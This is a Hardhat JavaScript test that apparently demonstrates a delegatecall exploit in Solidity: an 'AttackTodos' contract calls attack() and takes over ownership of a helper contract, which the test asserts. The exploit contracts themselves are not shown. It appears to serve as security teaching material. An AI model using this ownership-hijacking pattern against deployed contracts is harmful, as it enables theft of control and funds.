const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Attack', () => {
  let todos,attackHelper,attackTodos;

  beforeEach(async () => {

    [deployer,attacker]=await ethers.getSigners();
    const todoContract = await ethers.getContractFactory('Todos');
    deployedTodosContract = await todoContract.deploy();

    const attackHelperContract = await ethers.getContractFactory('AttackHelper');
    deployedAttackHelperContract = await attackHelperContract.deploy(deployedTodosContract.address);

    const attackTodosContract = await ethers.getContractFactory('AttackTodos');
    deployedAttackTodosContract= await attackTodosContract.deploy(deployedAttackHelperContract.address);

  })

  describe('the attack', () => {

    it('should change the owner to Attacker`s Address with delegateCall() exploit', async () => {
    console.log("Deployer Address:", deployer.address);
    console.log("Attacker Address:", attacker.address);
    console.log("Attacker Address:", deployedAttackTodosContract.address);
    expect(await deployedAttackHelperContract.owner()).to.equal(deployer.address);

    // performing attack 
    let tx = await deployedAttackTodosContract.connect(attacker).attack()
    await tx.wait();
    // onwer changed 
    expect(await deployedAttackHelperContract.owner()).to.equal(deployedAttackTodosContract.address);
    })
  })
})